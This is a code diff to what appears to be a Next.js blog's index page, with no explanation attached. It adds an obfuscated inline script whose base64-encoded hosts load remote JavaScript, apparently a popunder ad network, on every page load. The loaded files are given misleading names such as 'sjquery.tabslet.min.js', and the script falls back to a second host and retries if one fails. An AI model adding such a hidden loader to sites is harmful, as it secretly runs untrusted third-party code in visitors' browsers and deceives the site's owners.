@@ -11,6 +11,12 @@ import SEO from '../components/SEO';
 export default function Index({ posts, globalData }) {
   return (
     <Layout>
+      <script type="text/javascript" data-cfasync="false">
+    /*<![CDATA[/* */
+    (function(){var h=window,l="b304c9f893e53c18f0b51568f62d7c77",g=[["siteId",380-227*229-253+5125068],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer",!0]],o=["d3d3LmNkbjRhZHMuY29tL2ltYWdlcy9zdGF0aWMvc2pxdWVyeS50YWJzbGV0Lm1pbi5qcw==","ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvaGcycGxvdC5qcw=="],e=-1,w,u,c=function(){clearTimeout(u);e++;if(o[e]&&!(1734017153000<(new Date).getTime()&&1<e)){w=h.document.createElement("script");w.type="text/javascript";w.async=!0;var v=h.document.getElementsByTagName("script")[0];w.src="https://"+atob(o[e]);w.crossOrigin="anonymous";w.onerror=c;w.onload=function(){clearTimeout(u);h[l.slice(0,16)+l.slice(0,16)]||c()};u=setTimeout(c,5E3);v.parentNode.insertBefore(w,v)}};if(!h[l]){try{Object.freeze(h[l]=g)}catch(e){}c()}})();
+  /*]]>/* */
+  </script>
+    
       <SEO title={globalData.name} description={globalData.blogTitle} />
       <Header name={globalData.name} />
       <main className="w-full">
